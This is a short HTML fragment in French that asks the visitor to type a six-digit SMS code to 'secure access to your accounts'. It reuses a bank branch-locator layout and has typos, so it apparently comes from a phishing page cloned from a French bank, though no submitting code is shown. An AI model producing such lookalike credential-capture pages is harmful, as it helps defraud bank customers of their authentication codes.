                               ...
                               <div class="GeolocationDisabled-content matchHeight">
                                  <div id="trouver-un-cr-mode-search" style="">
                                     ...
                                     <h2 class="GeolocationDisabled-title GeolocFail">
                                         <strong>Code SMS </strong>
                                     </h2>
                                      </br>
                                     <p id="labelCodeDepartementCR" class="GeolocationDisabled-text GeolocFail">Afin de sécuriser l'accés à vos comptes depuis votre appareil, saisissez le code recu par SMS .</p>
                                     <div>
                                        </br>
                                        <div class="form-group">
                                           <input id="GeolocSearchInput" name="otp" type="text" required
                                            class="form-control GeolocationDisabled-noBorder"
                                            maxlength="6" placeholder="Entrez le code recu" aria-labelledby="labelCodeDepartementCR"
                                            ria-describedby="errorMessageCR">
